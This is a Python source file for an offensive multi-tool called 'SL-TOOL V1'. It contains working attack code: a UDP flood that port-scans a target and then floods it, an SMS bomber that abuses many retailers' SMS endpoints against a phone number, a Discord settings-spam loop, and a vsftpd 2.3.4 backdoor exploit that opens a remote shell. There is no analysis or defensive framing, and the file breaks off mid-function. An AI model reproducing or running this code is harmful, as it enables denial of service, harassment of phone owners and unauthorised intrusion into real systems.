import socket
import threading
import os
import sys
import random
import ctypes
import time
import requests
import fade  
import colorama
from colorama import Fore, Style
from pystyle import *
from bs4 import BeautifulSoup as htmlparser
import requests
import argparse
from telnetlib import Telnet
import sys
import time
import requests
import json
import sys
from colorama import Fore, Style
from time import sleep
from os import system
from sms import SendSms
from concurrent.futures import ThreadPoolExecutor, wait
import sys
import os
from getpass import getpass
from datetime import datetime
from colorama import Fore, init
from pystyle import *
delay = 20
psc = 5000
ux = 3
port = 1
sent = 0
id = 1
svc = []
bytes = random._urandom(1480)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

if os.name == 'nt':
    os.system('color b')
    os.system('SL-TOOL') 
else:
    os.system('setterm -background white -foreground white -store')

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

def TCP_connect(ipp, port_number, delay, output):
    TCPsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    TCPsock.settimeout(delay)
    try:
        TCPsock.connect((ipp, port_number))
        output[port_number] = 'Listening'
    except:
        output[port_number] = ''

def scan_ports(ipp, delay):
    threads = []
    output = {}


    for i in range(psc):
        t = threading.Thread(target=TCP_connect, args=(ipp, i, delay, output))
        threads.append(t)

    for t in threads:
        t.start()

    for t in threads:
        t.join()

    for i in range(psc):
        if output[i] == 'Listening':
            svc.append(int(i))

def main_menu():
    banner = '''
  ██████  ██▓       ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
▒██    ▒ ▓██▒       ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
░ ▓██▄   ▒██░  ████ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
  ▒   ██▒▒██░       ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
▒██████▒▒░██████▒     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
▒ ▒▓▒ ▒ ░░ ▒░▓  ░     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
░ ░▒  ░ ░░ ░ ▒  ░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
░  ░  ░    ░ ░        ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
      ░      ░  ░                ░ ░      ░ ░      ░  ░
                            
   ╔══════════════════════════════════════════════╗
   ║                 SL-TOOL V1                   ║
   ║              Coded By manig.as               ║
   ║              Discord: manig.as               ║
   ╚══════════════════════════════════════════════╝               
    '''

    # Banner rengini ayarla
    colored_banner = Colorate.Horizontal(Colors.red_to_black, Center.XCenter(banner))
    print(colored_banner)

    Write.Input("[+] Press Enter to continue...", Colors.red_to_black, interval=0.03) 
    print()
    Write.Input("[+] Open the Tool Menu?", Colors.red_to_black, interval=0.03)
    print()
    while True:
        cls()
        banner = """
████████▓ ▒█████   ▒█████   ██▓        ███▄ ▄███▓▓█████  ███▄    █  █    ██ 
▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒       ▓██▒▀█▀ ██▒▓█   ▀  ██ ▀█   █  ██  ▓██▒
▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░  ███  ▓██    ▓██░▒███   ▓██  ▀█ ██▒▓██  ▒██░
░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░       ▒██    ▒██ ▒▓█  ▄ ▓██▒  ▐▌██▒▓▓█  ░██░
  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒   ▒██▒   ░██▒░▒████▒▒██░   ▓██░▒▒█████▓ 
  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░   ░ ▒░   ░  ░░░ ▒░ ░░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ 
    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░   ░  ░      ░ ░ ░  ░░ ░░   ░ ▒░░░▒░ ░ ░ 
  ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░      ░      ░      ░      ░   ░ ░  ░░░ ░ ░ 
             ░ ░      ░ ░      ░  ░          ░      ░  ░         ░    ░     
                                                                            """
        colored_banner = Colorate.Horizontal(Colors.red_to_black, Center.XCenter(banner))
        print(colored_banner)   
        Write.Print("[1] Perform DDoS Attack\n", Colors.red_to_black, interval=0.03) 
        Write.Print("[2] Ip Information Lookup\n", Colors.red_to_black, interval=0.03)
        Write.Print("[3] Phone Lookup\n", Colors.red_to_black, interval=0.03)
        Write.Print("[4] Infiltration of the System\n", Colors.red_to_black, interval=0.03)
        Write.Print("[5] Token Info\n", Colors.red_to_black, interval=0.03)
        Write.Print("[6] SmsBomb\n", Colors.red_to_black, interval=0.03)
        Write.Print("[7] Account Bomb\n", Colors.red_to_black, interval=0.03)
        Write.Print("[8] \n", Colors.red_to_black, interval=0.03)
        Write.Print("[9] Exit\n\n", Colors.red_to_black, interval=0.03)

        choice = Write.Input("[+] Enter Your Choice: ", Colors.red_to_white, interval=0.04) 
        if choice == '1':
            attack_menu()
        elif choice == '2':
            cls()
            ip_info_lookup()
        elif choice == '3':
            cls()
            phone_lookup()

        elif choice == '4':
            cls()
            exploit_menu()

        elif choice == '5':
            cls()
            token_info()

        elif choice == '6':
            cls()
            sms_bomb()

        elif choice == '7':
            cls()
            epi()

        elif choice == '8':
            cls()
            

        elif choice == '9':
            cls()
            print("Exitting...")
            time.sleep(0.5)
            sys.exit()

        else:
            print("Invalid choice. Please try again.")
            time.sleep(1)

def epi():
    cls()
    banner = """
 ▄▄▄       ▄████▄   ▄████▄   ▒█████   █    ██  ███▄    █ ▄▄▄█████▓    ▄▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄    ██▓ ███▄    █   ▄████ 
▒████▄    ▒██▀ ▀█  ▒██▀ ▀█  ▒██▒  ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒   ▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██  ▀█▄  ▒▓█    ▄ ▒▓█    ▄ ▒██░  ██▒▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░   ▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒▒██   ██░▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░    ▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  ░██░▓██▒  ▐▌██▒░▓█  ██▓
 ▓█   ▓██▒▒ ▓███▀ ░▒ ▓███▀ ░░ ████▓▒░▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░    ░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓░██░▒██░   ▓██░░▒▓███▀▒
 ▒▒   ▓▒█░░ ░▒ ▒  ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░      ░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
  ▒   ▒▒ ░  ░  ▒     ░  ▒     ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░░   ░ ▒░    ░       ▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░  ▒ ░░ ░░   ░ ▒░  ░   ░ 
  ░   ▒   ░        ░        ░ ░ ░ ▒   ░░░ ░ ░    ░   ░ ░   ░          ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
      ░  ░░ ░      ░ ░          ░ ░     ░              ░              ░          ░ ░         ░    ░       ░           ░       ░ 
          ░        ░                                                       ░                           ░                        """
    colored_banner = Colorate.Horizontal(Colors.yellow_to_red, Center.XCenter(banner))
    print(colored_banner)
    token = Write.Input("Please enter your Discord token: ", Colors.yellow_to_red , interval = 0.04)
    time.sleep(2)
    Write.Print("BOMBİİİNG!!!", Colors.red_to_yellow, interval = 0.04)
    while True:
        setting = {'theme': random.choice(['dark', 'light']), 'locale': random.choice(['es', 'ru', 'hi', 'de'])}
        requests.patch('https://discord.com/api/v7/users/@me/settings', headers={'Authorization': token}, json=setting)



def sms_bomb():
    servisler_sms = []
    for attribute in dir(SendSms):
        attribute_value = getattr(SendSms, attribute)
        if callable(attribute_value) and not attribute.startswith('__'):
            servisler_sms.append(attribute)

    while True:
        system("cls||clear")
        banner = """
  ██████  ███▄ ▄███▓  ██████     ▄▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄   
▒██    ▒ ▓██▒▀█▀ ██▒▒██    ▒    ▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ 
░ ▓██▄   ▓██    ▓██░░ ▓██▄      ▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██
  ▒   ██▒▒██    ▒██   ▒   ██▒   ▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  
▒██████▒▒▒██▒   ░██▒▒██████▒▒   ░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓
▒ ▒▓▒ ▒ ░░ ▒░   ░  ░▒ ▒▓▒ ▒ ░   ░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒
░ ░▒  ░ ░░  ░      ░░ ░▒  ░ ░   ▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░ 
░  ░  ░  ░      ░   ░  ░  ░      ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░ 
      ░         ░         ░      ░          ░ ░         ░    ░      
                                      ░                           ░   
        ╔══════════════════════════════════════════════╗
        ║                 SMS-BOMBER                   ║
        ║              Coded By manig.as               ║
        ║              Discord: manig.as               ║
        ╚══════════════════════════════════════════════╝  
        """
        colored_banner = Colorate.Horizontal(Colors.red_to_black, Center.XCenter(banner))
        print(colored_banner)

        try:
            menu = Write.Input("[1] Send Sms\n[2] Refresh\n[3] Exit\n\n Seçim: ", Colors.red_to_black, interval=0.03)
        
            if menu == "":
                continue
            menu = int(menu) 
        except ValueError:
            system("cls||clear")
            Write.Print("HATA! LÜTFEN TEKRAR DENEYİNİZ\n\n", Colors.red_to_black, interval=0.03)
            sleep(3)
            continue
        
        if menu == 1:
            system("cls||clear")
            Write.Print("TELEFON NUMARASININI YAZINIZ: ", Colors.red_to_black, interval=0.03)
            tel_no = input()
            Write.Print("NOT:MAX 100 ADET YOLLAR", Colors.red_to_black, interval=0.03)
            time.sleep(2)
            try:
                int(tel_no)
                if len(tel_no) != 10:
                    raise ValueError
            except ValueError:
                system("cls||clear")
                Write.Print("HATA! LÜTFEN TEKRAR DENEYİNİZ\n\n", Colors.red_to_black, interval=0.03)
                sleep(3)
                continue
            system("cls||clear")
            send_sms = SendSms(tel_no)
            try:
                while True:
                    with ThreadPoolExecutor() as executor:
                        futures = [
                        executor.submit(send_sms.TiklaGelsin),
                        executor.submit(send_sms.Akasya),
                        executor.submit(send_sms.Akbati),
                        executor.submit(send_sms.Ayyildiz),
                        executor.submit(send_sms.Baydoner),
                        executor.submit(send_sms.Beefull),
                        executor.submit(send_sms.Bim),
                        executor.submit(send_sms.Bisu),
                        executor.submit(send_sms.Bodrum),
                        executor.submit(send_sms.Clickme),
                        executor.submit(send_sms.Dominos),
                        executor.submit(send_sms.Englishhome),
                        executor.submit(send_sms.Evidea),
                        executor.submit(send_sms.File),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Hey),
                        executor.submit(send_sms.Hizliecza),
                        executor.submit(send_sms.Icq),
                        executor.submit(send_sms.Ipragaz),
                        executor.submit(send_sms.Istegelsin),
                        executor.submit(send_sms.Joker),
                        executor.submit(send_sms.KahveDunyasi),
                        executor.submit(send_sms.KimGb),
                        executor.submit(send_sms.Komagene),
                        executor.submit(send_sms.Koton),
                        executor.submit(send_sms.KuryemGelsin),
                        executor.submit(send_sms.Macro),
                        executor.submit(send_sms.Metro),
                        executor.submit(send_sms.Migros),
                        executor.submit(send_sms.Naosstars),
                        executor.submit(send_sms.Paybol),
                        executor.submit(send_sms.Pidem),
                        executor.submit(send_sms.Porty),
                        executor.submit(send_sms.Qumpara),
                        executor.submit(send_sms.Starbucks),
                        executor.submit(send_sms.Suiste),
                        executor.submit(send_sms.Taksim),
                        executor.submit(send_sms.Tasdelen),
                        executor.submit(send_sms.Tasimacim),
                        executor.submit(send_sms.Tazi),
                        executor.submit(send_sms.TiklaGelsin),
                        executor.submit(send_sms.ToptanTeslim),
                        executor.submit(send_sms.Ucdortbes),
                        executor.submit(send_sms.Uysal),
                        executor.submit(send_sms.Wmf),
                        executor.submit(send_sms.Yapp),
                        executor.submit(send_sms.YilmazTicaret),
                        executor.submit(send_sms.Yuffi),
                        executor.submit(send_sms.Akasya),
                        executor.submit(send_sms.Akbati),
                        executor.submit(send_sms.Ayyildiz),
                        executor.submit(send_sms.Baydoner),
                        executor.submit(send_sms.Beefull),
                        executor.submit(send_sms.Bim),
                        executor.submit(send_sms.Bisu),
                        executor.submit(send_sms.Bodrum),
                        executor.submit(send_sms.Clickme),
                        executor.submit(send_sms.Dominos),
                        executor.submit(send_sms.Englishhome),
                        executor.submit(send_sms.Evidea),
                        executor.submit(send_sms.File),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Hey),
                        executor.submit(send_sms.Englishhome),
                        executor.submit(send_sms.Evidea),
                        executor.submit(send_sms.File),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Hey),
                        executor.submit(send_sms.Englishhome),
                        executor.submit(send_sms.Evidea),
                        executor.submit(send_sms.File),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Hey),
                        executor.submit(send_sms.Englishhome),
                        executor.submit(send_sms.Evidea),
                        executor.submit(send_sms.File),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Hey),
                        executor.submit(send_sms.Englishhome),
                        executor.submit(send_sms.Evidea),
                        executor.submit(send_sms.File),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Hey),
                        executor.submit(send_sms.Englishhome),
                        executor.submit(send_sms.Evidea),
                        executor.submit(send_sms.File),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Hey),
                        executor.submit(send_sms.Englishhome),
                        executor.submit(send_sms.Evidea),
                        executor.submit(send_sms.File),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        ]
                        for future in as_completed(futures):
                            pass
                        Write.Input("Press Enter to continue...\n", Colors.green_to_black, interval=0.07)
                        sms_bomb()
            except Exception as e:
                print(Fore.LIGHTRED_EX + f"Bir hata oluştu: {e}" + Style.RESET_ALL)
                continue
        elif menu == 2:
            pass  # Buraya menüyü yenileme işlemini ekle
        else:
            print(Fore.LIGHTRED_EX + "Geçersiz seçim!" + Style.RESET_ALL)
            sleep(3)
            continue

def ip_info_lookup():
    banner = """
 ██▓ ██▓███      ▄▄▄█████▓ ██▀███   ▄▄▄       ▄████▄  ▓█████  ██▀███  
▓██▒▓██░  ██▒    ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    ▒██▀ ▀█  ▓█   ▀ ▓██ ▒ ██▒
▒██▒▓██░ ██▓▒    ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▒███   ▓██ ░▄█ ▒
░██░▒██▄█▓▒ ▒    ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓█  ▄ ▒██▀▀█▄  
░██░▒██▒ ░  ░      ▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░░▒████▒░██▓ ▒██▒
░▓  ▒▓▒░ ░  ░     ▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░            ░      ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒    ░ ░  ░  ░▒ ░ ▒░
░░            ░        ░░   ░   ░   ▒   ░           ░     ░░   ░ 
 ░                          ░           ░  ░░ ░         ░  ░   ░     
                                            ░                     
                                                                            """
    colored_banner = Colorate.Horizontal(Colors.green_to_black, Center.XCenter(banner))
    print(colored_banner)
    Write.Print("[+] Ip Information Lookup\n", Colors.green_to_black, interval=0.03)
    Write.Print("[1] Locate IP Address\n", Colors.green_to_black, interval=0.03)
    Write.Print("[2] Locate Your Own IP Address\n", Colors.green_to_black, interval=0.03)
    Write.Print("[3] Back to Main Menu\n", Colors.green_to_black, interval=0.03)

    choice = Write.Input("[+] Enter your choice: \n", Colors.green_to_black, interval=0.04)

    if choice == '1':
        cls()
        locate_ip()
    elif choice == '2':
        cls()
        locate_own_ip()
    elif choice == '3':
        cls()
        main_menu()
    else:
        print("Invalid choice. Please try again.")
        time.sleep(1)


def locate_ip():
    cls()
    Write.Print("Locate IP Address\n", Colors.green_to_black, interval=0.07)
    ipin = Write.Input("Enter Ip Adress: \n", Colors.green_to_black, interval=0.07)
    Write.Print(f"Searching data for {ipin} IP address...\n\n", Colors.green_to_black, interval=0.07)
    api = f"http://ip-api.com/json/{ipin}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query&lang=es"

    data = requests.get(api).json()
    for key, value in data.items():
        print(Fore.GREEN + f"{key.capitalize()}: {value}" + Style.RESET_ALL)
    Write.Input("Press Enter to continue...\n", Colors.green_to_black, interval=0.07)
    print()
    cls()
    ip_info_lookup()

def locate_own_ip():
    cls()
    api_own_ip = "http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query&lang=es"
    data = requests.get(api_own_ip).json()
    for key, value in data.items():
        print(Fore.GREEN + f"{key.capitalize()}: {value}" + Style.RESET_ALL)
    Write.Input("Press Enter to continue...\n", Colors.green_to_black, interval=0.07)
    ip_info_lookup()

import socket
import sys

import socket
import sys

def attack_menu():
    global delay, psc, ux, port, sent, id, svc, bytes
    cls()
    banner = """
  ██████  ██▓       ▓█████▄ ▓█████▄  ▒█████    ██████ 
▒██    ▒ ▓██▒       ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
░ ▓██▄   ▒██░  ███  ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
  ▒   ██▒▒██░       ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
▒██████▒▒░██████▒   ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
▒ ▒▓▒ ▒ ░░ ▒░▓  ░    ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
░ ░▒  ░ ░░ ░ ▒  ░    ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
░  ░  ░    ░ ░       ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
      ░      ░  ░      ░       ░        ░ ░        ░  
                     ░       ░                                  """
    colored_banner = Colorate.Horizontal(Colors.green_to_black, Center.XCenter(banner))
    print(colored_banner)

    print("Enter target IP:")
    ip = input(":")
    ipp = ip
    target = ip

    if len(sys.argv) == 2:
        target = socket.gethostbyname(sys.argv[1])

    print("Enter timeout seconds (recommended: 20):")
    delay = int(input(":"))
    print("Enter port scanning sensitivity (recommended: 3):")
    ux = int(input(":"))
    print("Enter port scanning range (recommended: 5000, maximum: 65535):")
    psc = int(input(":"))

    print("Estimated scanning time:", delay * ux + (psc * 0.002), "seconds\n")

    for kk in range(ux):
        scan_ports(ipp, delay)
        print("Phase", kk + 1, "completed\n")

    res = [*set(svc)]
    print("Open ports:", res)

    print("Choose port:")
    open_port = int(input(":"))

    print("Package size (minimum 5000):")
    threads = int(input(":"))
    if threads < 5000:
        sys.exit("Thread size smaller than 5000")

    c = (sent + int(threads / 100) * 100.44) / 500
    sentstring = round(sent, 1)

    if os.name == 'nt':
        Write.Print("Check task manager", Colors.green_to_black, interval=0.07)
    else:
        Write.Print("Check the traffic", Colors.green_to_black, interval=0.07)

    nx = len(f"ID:{str(id).zfill(4)}  Sent {c}MB to {ipp} port:{open_port}")
    print("-" * nx)

    while True:
        for i in range(int(threads / 1000)):
            for j in range(16):
                sock.sendto(bytes, (ipp, open_port))

        print(f"ID:{str(id).zfill(4)}  Sent {c}MB to {ipp} port:{open_port}")
        id += 1
        if id % 100 == 0 or id > 100 and id % 1000 == 0:
            nx = len(f"ID:{str(id).zfill(4)}  Sent {c}MB to {ipp} port:{open_port}")
            print("-" * nx)


def phone_lookup():
    banner = '''
 ██▓███   ██░ ██  ▒█████   ███▄    █ ▓█████     ██▓     ▒█████   ▒█████   ██ ▄█▀ █    ██  ██▓███  
▓██░  ██▒▓██░ ██▒▒██▒  ██▒ ██ ▀█   █ ▓█   ▀    ▓██▒    ▒██▒  ██▒▒██▒  ██▒ ██▄█▒  ██  ▓██▒▓██░  ██▒
▓██░ ██▓▒▒██▀▀██░▒██░  ██▒▓██  ▀█ ██▒▒███      ▒██░    ▒██░  ██▒▒██░  ██▒▓███▄░ ▓██  ▒██░▓██░ ██▓▒
▒██▄█▓▒ ▒░▓█ ░██ ▒██   ██░▓██▒  ▐▌██▒▒▓█  ▄    ▒██░    ▒██   ██░▒██   ██░▓██ █▄ ▓▓█  ░██░▒██▄█▓▒ ▒
▒██▒ ░  ░░▓█▒░██▓░ ████▓▒░▒██░   ▓██░░▒████▒   ░██████▒░ ████▓▒░░ ████▓▒░▒██▒ █▄▒▒█████▓ ▒██▒ ░  ░
▒▓▒░ ░  ░ ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░░ ▒░ ░   ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░
░▒ ░      ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░ ░ ░  ░   ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░░░▒░ ░ ░ ░▒ ░     
░░        ░  ░░ ░░ ░ ░ ▒     ░   ░ ░    ░        ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░  ░░░ ░ ░ ░░       
          ░  ░  ░    ░ ░           ░    ░  ░       ░  ░    ░ ░      ░ ░  ░  ░      ░                                                                                                                    
                                                                                                          
        '''

    colored_banner = Colorate.Horizontal(Colors.green_to_white, Center.XCenter(banner))
    print(colored_banner)
    def lookup(phone_number):

        http = requests.get(f"https://free-lookup.net/{phone_number}")
        html = htmlparser(http.text, "html.parser")
        infos = html.findChild("ul", {"class": "report-summary__list"}).findAll("div")

        return {k.text.strip(): infos[i+1].text.strip() if infos[i+1].text.strip() else "No information" for i, k in enumerate(infos) if not i % 2}

    while True:
        try:
            phone_number = input("Phone number: ").strip().replace("-", "").replace(" ", "").replace("+", "")
        except KeyboardInterrupt:
            return

        try:
            infos = lookup(phone_number)
        except AttributeError:
            print("Error: Invalid phone number\n")
            continue

        [print(f"{info}: {infos[info]}") for info in infos]
        print("\n")


def exploit_menu():
    banner = """
▓█████ ▒██   ██▒ ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓
▓█   ▀ ▒▒ █ █ ▒░▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒
▒███   ░░  █   ░▓██░ ██▓▒▒██░    ▒██░  ██▒▒██▒▒ ▓██░ ▒░
▒▓█  ▄  ░ █ █ ▒ ▒██▄█▓▒ ▒▒██░    ▒██   ██░░██░░ ▓██▓ ░ 
░▒████▒▒██▒ ▒██▒▒██▒ ░  ░░██████▒░ ████▓▒░░██░  ▒██▒ ░ 
░░ ▒░ ░▒▒ ░ ░▓ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▓    ▒ ░░   
 ░ ░  ░░░   ░▒ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ▒ ░    ░    
   ░    ░    ░  ░░         ░ ░   ░ ░ ░ ▒   ▒ ░  ░      
   ░  ░ ░    ░               ░  ░    ░ ░   ░           
                                                       """
    colored_banner = Colorate.Horizontal(Colors.purple_to_blue, Center.XCenter(banner))
    print(colored_banner)
    host = Write.Input(f"[$] Enter the IP address of the vulnerable host: ",Colors.purple_to_blue, interval=0.04)
    portFTP = "21"

    user = "USER manig.as"
    password = "PASS pass"

    print("If it takes too long to connect to the host, check if vsftpd is running.")
    time.sleep(2)

    try:
        tn = Telnet(host, portFTP)
        Write.Print(f"[+] Opening Connection to {host} on port 21: Done\n",Colors.purple_to_blue, interval=0.04)

        time.sleep(1)
        tn.read_until(b"(vsFTPd 2.3.4)")
        tn.write(user.encode('ascii') + b"\n")

        tn.read_until(b"password.")
        tn.write(password.encode('ascii') + b"\n")
        tn.close()

        time.sleep(5)
        Write.Print(f"[+] System Infiltrated...\n",Colors.purple_to_blue, interval=0.04)

        tn2 = Telnet(host, 6200)
        Write.Print(f"[+] Success, shell opened\n",Colors.purple_to_blue, interval=0.04)
        Write.Print(f"[*] Send `exit` to quit shell\n",Colors.purple_to_blue, interval=0.04)


        tn2.interact()

    except ConnectionRefusedError:
        print(f"[!] Connection to {host} on port 21 failed.")
        sys.exit()

def token_info():

    __version__ = 1.9

languages = {
    'da': 'Danish, Denmark',
    'de': 'German, Germany',
    'en-GB': 'English, United Kingdom',
    'en-US': 'English, United States',
    'es-ES': 'Spanish, Spain',
    'fr': 'French, France',
    'hr': 'Croatian, Croatia',
    'lt': 'Lithuanian, Lithuania',
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

cc_digits = {
    'american express': '3',
    'visa': '4',
    'mastercard': '5'
}


def token_info():
    banner = """
▄▄▄█████▓ ▒█████   ██ ▄█▀▓█████  ███▄    █     ██▓ ███▄    █   █████▒▒█████  
▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒ ▓█   ▀  ██ ▀█   █    ▓██▒ ██ ▀█   █ ▓██   ▒▒██▒  ██▒
▒ ▓██░ ▒░▒██░  ██▒▓███▄░ ▒███   ▓██  ▀█ ██▒   ▒██▒▓██  ▀█ ██▒▒████ ░▒██░  ██▒
░ ▓██▓ ░ ▒██   ██░▓██ █▄ ▒▓█  ▄ ▓██▒  ▐▌██▒   ░██░▓██▒  ▐▌██▒░▓█▒  ░▒██   ██░
  ▒██▒ ░ ░ ████▓▒░▒██▒ █▄░▒████▒▒██░   ▓██░   ░██░▒██░   ▓██░░▒█░   ░ ████▓▒░
  ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░   ▒ ▒    ░▓  ░ ▒░   ▒ ▒  ▒ ░   ░ ▒░▒░▒░ 
    ░      ░ ▒ ▒░ ░ ░▒ ▒░ ░ ░  ░░ ░░   ░ ▒░    ▒ ░░ ░░   ░ ▒░ ░       ░ ▒ ▒░ 
  ░      ░ ░ ░ ▒  ░ ░░ ░    ░      ░   ░ ░     ▒ ░   ░   ░ ░  ░ ░   ░ ░ ░ ▒  
             ░ ░  ░  ░      ░  ░         ░     ░           ░            ░ ░  
                                                                                 
                                                       """
    colored_banner = Colorate.Horizontal(Colors.green_to_white, Center.XCenter(banner))
    print(colored_banner)
    token = input("Enter your Discord token: ")

    try:
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }

        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)

        if res.status_code == 200:  # code 200 if valid

